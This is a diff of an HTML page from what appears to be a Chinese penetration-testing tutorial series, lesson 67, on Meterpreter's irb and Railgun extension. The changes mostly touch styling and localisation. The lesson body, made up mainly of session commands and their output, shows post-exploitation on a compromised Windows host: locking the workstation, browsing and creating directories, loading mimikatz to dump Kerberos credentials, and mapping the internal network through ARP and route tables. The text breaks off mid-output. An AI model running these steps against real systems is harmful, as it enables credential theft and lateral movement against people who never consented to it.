@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第六十七课：meterpreter下的irb操作第一季 · GitBook</title>
+        <title>第六十七课：meterpreter下的irb操作第一季 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="66_借助aspx对payload进行分离免杀.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1826,87 +1868,87 @@
                                 <p><strong>Railgun&#x662F;Meterpreter stdapi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x5141;&#x8BB8;&#x4EFB;&#x610F;&#x52A0;&#x8F7D;DLL&#x3002;Railgun&#x7684;&#x6700;&#x5927;&#x597D;&#x5904;&#x662F;&#x80FD;&#x591F;&#x52A8;&#x6001;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x6574;&#x4E2A;Windows API&#x3002;&#x901A;&#x8FC7;&#x4ECE;&#x7528;&#x6237;&#x8FDB;&#x7A0B;&#x8C03;&#x7528;Windows API&#x3002;</strong><br><img src="media/3887a1136b060d02cc820deceb0610c5.jpg" alt=""></p>
 <p>meterpreter&#x4E0B;&#x6267;&#x884C;irb&#x8FDB;&#x5165;ruby&#x4EA4;&#x4E92;&#x3002;</p>
 <p>&#x57FA;&#x672C;&#x7684;&#x4FE1;&#x606F;&#x641C;&#x96C6;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.sys.config.sysinfo[<span class="hljs-string">&apos;OS&apos;</span>]
-=&gt; <span class="hljs-string">&quot;Windows .NET Server (Build 3790, Service Pack 2).&quot;</span>
-&gt;&gt; client.sys.config.getuid
-=&gt; <span class="hljs-string">&quot;WIN03X64\\Administrator&quot;</span>
-&gt;&gt; interfaces = client.net.config.interfaces
-=&gt;[<span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6}&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1,@mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l,@addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span>
-&gt;&gt; interfaces.each <span class="hljs-keyword">do</span> |i|
-?&gt; puts i.pretty
-&gt;&gt; end
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.sys.config.sysinfo<span class="token punctuation">[</span><span class="token string">&apos;OS&apos;</span><span class="token punctuation">]</span>
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;Windows .NET Server (Build 3790, Service Pack 2).&quot;</span>
+<span class="token operator">&gt;&gt;</span> client.sys.config.getuid
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;WIN03X64\\Administrator&quot;</span>
+<span class="token operator">&gt;&gt;</span> interfaces <span class="token operator">=</span> client.net.config.interfaces
+<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6}&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1,@mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l,@addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span>
+<span class="token operator">&gt;&gt;</span> interfaces.each <span class="token keyword">do</span> <span class="token operator">|</span>i<span class="token operator">|</span>
+?<span class="token operator">&gt;</span> puts i.pretty
+<span class="token operator">&gt;&gt;</span> end
 
 Interface 65539
- ============
-Name : Intel(R) PRO/1000 MT Network Connection
-Hardware MAC : 00:0c:29:85:d6:7d
-MTU : 1500
-IPv4 Address : 192.168.1.119
-IPv4 Netmask : 255.255.255.0
+ <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+Name <span class="token keyword">:</span> Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection
+Hardware MAC <span class="token keyword">:</span> 00:0c:29:85:d6:7d
+MTU <span class="token keyword">:</span> 1500
+IPv4 Address <span class="token keyword">:</span> 192.168.1.119
+IPv4 Netmask <span class="token keyword">:</span> 255.255.255.0
 Interface 1
- ============
-Name : MS TCP Loopback interface
-Hardware MAC : 00:00:00:00:00:00
-MTU : 1520
-IPv4 Address : 127.0.0.1
-=&gt;[<span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6}&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1, @mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l, @addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span>
-&gt;&gt;
+ <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+Name <span class="token keyword">:</span> MS TCP Loopback interface
+Hardware MAC <span class="token keyword">:</span> 00:00:00:00:00:00
+MTU <span class="token keyword">:</span> 1520
+IPv4 Address <span class="token keyword">:</span> 127.0.0.1
+<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6}&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1, @mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l, @addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span>
+<span class="token operator">&gt;&gt;</span>
 </code></pre>
 <p><img src="media/c699d8499e9ccc7e52378c7a4aab8b16.jpg" alt=""></p>
 <p>&#x9501;&#x5B9A;&#x6CE8;&#x9500;&#x76EE;&#x6807;&#x673A;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.railgun.user32.LockWorkStation()
-=&gt; {<span class="hljs-string">&quot;GetLastError&quot;</span>=&gt;0, <span class="hljs-string">&quot;ErrorMessage&quot;</span>=&gt;<span class="hljs-string">&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;</span>, <span class="hljs-string">&quot;return&quot;</span>=&gt;<span class="hljs-literal">true</span>}
-&gt;&gt;
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.railgun.user32.LockWorkStation<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token string">&quot;GetLastError&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span>0, <span class="token string">&quot;ErrorMessage&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;</span>, <span class="token string">&quot;return&quot;</span><span class="token operator">=</span><span class="token operator">&gt;</span>true<span class="token punctuation">}</span>
+<span class="token operator">&gt;&gt;</span>
 </code></pre>
 <p><img src="media/16c29aa470deb87ea1321eecf1cf97b3.jpg" alt=""></p>
 <p>&#x8C03;&#x7528;MessageBox&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.railgun.user32.MessageBoxA(0, <span class="hljs-string">&quot;Micropoor&quot;</span>, <span class="hljs-string">&quot;Micropoor&quot;</span>, <span class="hljs-string">&quot;MB_OK&quot;</span>)
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.railgun.user32.MessageBoxA<span class="token punctuation">(</span>0, <span class="token string">&quot;Micropoor&quot;</span>, <span class="token string">&quot;Micropoor&quot;</span>, <span class="token string">&quot;MB_OK&quot;</span><span class="token punctuation">)</span>
 </code></pre>
 <p><img src="media/f2fa18b3dd40787d8cff662aa133adb6.jpg" alt=""></p>
 <p>&#x5FEB;&#x901F;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.fs.dir.pwd
-=&gt; <span class="hljs-string">&quot;C:\\Documents and Settings\\Administrator\\\xE6\xA1\x8C\xE9\x9D\xA 2&quot;</span>
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.fs.dir.pwd
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;C:\\Documents and Settings\\Administrator\\\xE6\xA1\x8C\xE9\x9D\xA 2&quot;</span>
 </code></pre>
 <p>&#x76EE;&#x5F55;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.fs.dir.chdir(<span class="hljs-string">&quot;c:\\&quot;</span>)
-=&gt; 0
-&gt;&gt; client.fs.dir.entries
-=&gt; [<span class="hljs-string">&quot;ADFS&quot;</span>, <span class="hljs-string">&quot;AUTOEXEC.BAT&quot;</span>, <span class="hljs-string">&quot;boot.ini&quot;</span>, <span class="hljs-string">&quot;bootfont.bin&quot;</span>, <span class="hljs-string">&quot;CONFIG.SYS&quot;</span>, <span class="hljs-string">&quot;Documents and Settings&quot;</span>, <span class="hljs-string">&quot;Inetpub&quot;</span>, <span class="hljs-string">&quot;IO.SYS&quot;</span>, <span class="hljs-string">&quot;MSDOS.SYS&quot;</span>, <span class="hljs-string">&quot;NTDETECT.CO M&quot;</span>, <span class="hljs-string">&quot;ntldr&quot;</span>, <span class="hljs-string">&quot;pagefile.sys&quot;</span>, <span class="hljs-string">&quot;Program Files&quot;</span>, <span class="hljs-string">&quot;Program Files (x86)&quot;</span>, <span class="hljs-string">&quot;RECYCLER&quot;</span>, <span class="hljs-string">&quot;System Volume Information&quot;</span>, <span class="hljs-string">&quot;WINDOWS&quot;</span>, <span class="hljs-string">&quot;wmpub&quot;</span>]
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.fs.dir.chdir<span class="token punctuation">(</span><span class="token string">&quot;c:\\&quot;</span><span class="token punctuation">)</span>
+<span class="token operator">=</span><span class="token operator">&gt;</span> 0
+<span class="token operator">&gt;&gt;</span> client.fs.dir.entries
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token string">&quot;ADFS&quot;</span>, <span class="token string">&quot;AUTOEXEC.BAT&quot;</span>, <span class="token string">&quot;boot.ini&quot;</span>, <span class="token string">&quot;bootfont.bin&quot;</span>, <span class="token string">&quot;CONFIG.SYS&quot;</span>, <span class="token string">&quot;Documents and Settings&quot;</span>, <span class="token string">&quot;Inetpub&quot;</span>, <span class="token string">&quot;IO.SYS&quot;</span>, <span class="token string">&quot;MSDOS.SYS&quot;</span>, <span class="token string">&quot;NTDETECT.CO M&quot;</span>, <span class="token string">&quot;ntldr&quot;</span>, <span class="token string">&quot;pagefile.sys&quot;</span>, <span class="token string">&quot;Program Files&quot;</span>, <span class="token string">&quot;Program Files (x86)&quot;</span>, <span class="token string">&quot;RECYCLER&quot;</span>, <span class="token string">&quot;System Volume Information&quot;</span>, <span class="token string">&quot;WINDOWS&quot;</span>, <span class="token string">&quot;wmpub&quot;</span><span class="token punctuation">]</span>
 </code></pre>
 <p>&#x5EFA;&#x7ACB;&#x6587;&#x4EF6;&#x5939;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.fs.dir.mkdir(<span class="hljs-string">&quot;Micropoor&quot;</span>)
-=&gt; 0
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.fs.dir.mkdir<span class="token punctuation">(</span><span class="token string">&quot;Micropoor&quot;</span><span class="token punctuation">)</span>
+<span class="token operator">=</span><span class="token operator">&gt;</span> 0
 </code></pre>
 <p><img src="media/bf1667163d90cf5139ce06d51c5e0d76.jpg" alt=""></p>
 <p>hash&#x64CD;&#x4F5C;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.core.use <span class="hljs-string">&quot;mimikatz&quot;</span>
-=&gt; <span class="hljs-literal">true</span>
-&gt;&gt; client.mimikatz
-=&gt; <span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Mimikatz::Mimikatz:0x000055aee91ceb28 @client=#&lt;Session:meterpreter 192.168.1.119:53 (192.168.1.119) &quot;WIN03X64\Administrator @ WIN03X64&quot;&gt;, @name=&quot;mimikatz&quot;&gt;</span>
-&gt;&gt; client.mimikatz.kerberos
-=&gt;[{:authid=&gt;<span class="hljs-string">&quot;0;996&quot;</span>, :package=&gt;<span class="hljs-string">&quot;Negotiate&quot;</span>, :user=&gt;<span class="hljs-string">&quot;NETWORKSERVICE&quot;</span>, :domain=&gt;<span class="hljs-string">&quot;NT AUTHORITY&quot;</span>, :password=&gt;<span class="hljs-string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span>},{:authid=&gt;<span class="hljs-string">&quot;0;44482&quot;</span>, :package=&gt;<span class="hljs-string">&quot;NTLM&quot;</span>, :user=&gt;<span class="hljs-string">&quot;&quot;</span>, :domain=&gt;<span class="hljs-string">&quot;&quot;</span>,:password=&gt;<span class="hljs-string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B \x02 \nn.a. (kerberos KO)&quot;</span>}, {:authid=&gt;<span class="hljs-string">&quot;0;115231&quot;</span>,:package=\&gt;<span class="hljs-string">&quot;NTLM&quot;</span>, :user=&gt;<span class="hljs-string">&quot;Administrator&quot;</span>, :domain=&gt;<span class="hljs-string">&quot;WIN03X64&quot;</span>,:password=&gt;<span class="hljs-string">&quot;mod_process::getVery BasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadPocessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span>}, {:a uthid=&gt;<span class="hljs-string">&quot;0;997&quot;</span>,:package=&gt;<span class="hljs-string">&quot;Negotiate&quot;</span>, :user=&gt;<span class="hljs-string">&quot;LOCAL SERVICE&quot;</span>, :domain=&gt;<span class="hljs-string">&quot;NT AUTHORITY&quot;</span>,:password=&gt;<span class="hljs-string">&quot;mod_process::getVeryBasicModulesList ForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span>}, {:authid=&gt;<span class="hljs-string">&quot;0;999&quot;</span>, package=&gt;<span class="hljs-string">&quot;NTLM&quot;</span>,
-:user=&gt;<span class="hljs-string">&quot;WIN03X64$&quot;</span>, :domain=&gt;<span class="hljs-string">&quot;WORKGROUP&quot;</span>, :password=&gt;<span class="hljs-string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span>}]
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.core.use <span class="token string">&quot;mimikatz&quot;</span>
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">true</span>
+<span class="token operator">&gt;&gt;</span> client.mimikatz
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Mimikatz::Mimikatz:0x000055aee91ceb28 @client=#&lt;Session:meterpreter 192.168.1.119:53 (192.168.1.119) &quot;WIN03X64\Administrator @ WIN03X64&quot;&gt;, @name=&quot;mimikatz&quot;&gt;</span>
+<span class="token operator">&gt;&gt;</span> client.mimikatz.kerberos
+<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token punctuation">[</span><span class="token punctuation">{</span>:authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;0;996&quot;</span>, :package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;Negotiate&quot;</span>, :user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;NETWORKSERVICE&quot;</span>, :domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;NT AUTHORITY&quot;</span>, :password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span>:authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;0;44482&quot;</span>, :package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;NTLM&quot;</span>, :user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;&quot;</span>, :domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;&quot;</span>,:password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B \x02 \nn.a. (kerberos KO)&quot;</span><span class="token punctuation">}</span>, <span class="token punctuation">{</span>:authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;0;115231&quot;</span>,:package<span class="token operator">=</span>\<span class="token operator">&gt;</span><span class="token string">&quot;NTLM&quot;</span>, :user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;Administrator&quot;</span>, :domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;WIN03X64&quot;</span>,:password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;mod_process::getVery BasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadPocessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span><span class="token punctuation">}</span>, <span class="token punctuation">{</span>:a uthid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;0;997&quot;</span>,:package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;Negotiate&quot;</span>, :user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;LOCAL SERVICE&quot;</span>, :domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;NT AUTHORITY&quot;</span>,:password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;mod_process::getVeryBasicModulesList ForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span><span class="token punctuation">}</span>, <span class="token punctuation">{</span>:authid<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;0;999&quot;</span>, package<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;NTLM&quot;</span>,
+:user<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;WIN03X64$&quot;</span>, :domain<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;WORKGROUP&quot;</span>, :password<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
 </code></pre>
 <p><img src="media/a03610b1b7f3c56a8905319c9f8ce20f.jpg" alt=""></p>
 <p>&#x5185;&#x7F51;&#x4E3B;&#x673A;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x8DEF;&#x7531;&#xFF0C;arp&#x7B49;&#xFF1A;</p>
-<pre><code class="lang-bash">&gt;&gt; client.net.config.arp_table
-=&gt; [<span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5f6b8 @ip_addr=&quot;192.168.1.1&quot;, @mac_addr=&quot;78:44:fd:8e:91:59&quot;, @interface=&quot;65539&quot;&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5ee20 @ip_addr=&quot;192.168.1.3&quot;, @mac_addr=&quot;28:16:ad:3b:51:78&quot;, @inteface=&quot;65539&quot;&gt;]</span>
-&gt;&gt; client.net.config.arp_table[0].ip_addr
-&gt;&gt; =&gt; <span class="hljs-string">&quot;192.168.1.1&quot;</span>
-&gt;&gt; client.net.config.arp_table[0].mac_addr
-=&gt; <span class="hljs-string">&quot;78:44:fd:8e:91:59&quot;</span>
-&gt;&gt; client.net.config.arp_table[0].interface
-=&gt; <span class="hljs-string">&quot;65539&quot;</span>
-&gt;&gt; client.net.config.routes
-=&gt; [<span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee789be58 @subnet=&quot;0.0.0.0&quot;, @netmask=&quot;0.0.0.0&quot;, @gateway=&quot;192.168.1.1&quot;,</span>
-@interface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=10&gt;,<span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::St</span>
-dapi::Net::Route:0x000055aee789a7b0 @subnet=<span class="hljs-string">&quot;127.0.0.0&quot;</span>, @netmask=<span class="hljs-string">&quot;255.0.0.0&quot;</span>, @gateway=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, @interface=<span class="hljs-string">&quot;1&quot;</span>, @metric=1&gt;, <span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee78993b0 \@subnet=&quot;192.168.1.0&quot;, @netmask=&quot;255.255.255.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786fec0 @subnet=&quot;192.168.1.119&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;127.0.0.1&quot;, @interface=&quot;1&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786e9d0 @subnet=&quot;192.168.1.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;, @inte</span>
-rface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=10&gt;, <span class="hljs-comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786d698 @subnet=&quot;224.0.0.0&quot;, @netmask=&quot;240.0.0.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee785be98 @subnet=&quot;255.255.255.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;,</span>
-@interface=<span class="hljs-string">&quot;65539&quot;</span>, @metric=1&gt;]
+<pre class="language-"><code class="lang-bash"><span class="token operator">&gt;&gt;</span> client.net.config.arp_table
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5f6b8 @ip_addr=&quot;192.168.1.1&quot;, @mac_addr=&quot;78:44:fd:8e:91:59&quot;, @interface=&quot;65539&quot;&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5ee20 @ip_addr=&quot;192.168.1.3&quot;, @mac_addr=&quot;28:16:ad:3b:51:78&quot;, @inteface=&quot;65539&quot;&gt;]</span>
+<span class="token operator">&gt;&gt;</span> client.net.config.arp_table<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.ip_addr
+<span class="token operator">&gt;&gt;</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;192.168.1.1&quot;</span>
+<span class="token operator">&gt;&gt;</span> client.net.config.arp_table<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.mac_addr
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;78:44:fd:8e:91:59&quot;</span>
+<span class="token operator">&gt;&gt;</span> client.net.config.arp_table<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.interface
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">&quot;65539&quot;</span>
+<span class="token operator">&gt;&gt;</span> client.net.config.routes
+<span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee789be58 @subnet=&quot;0.0.0.0&quot;, @netmask=&quot;0.0.0.0&quot;, @gateway=&quot;192.168.1.1&quot;,</span>
+@interface<span class="token operator">=</span><span class="token string">&quot;65539&quot;</span>, @metric<span class="token operator">=</span>10<span class="token operator">&gt;</span>,<span class="token comment">#&lt;Rex::Post::Meterpreter::Extensions::St</span>
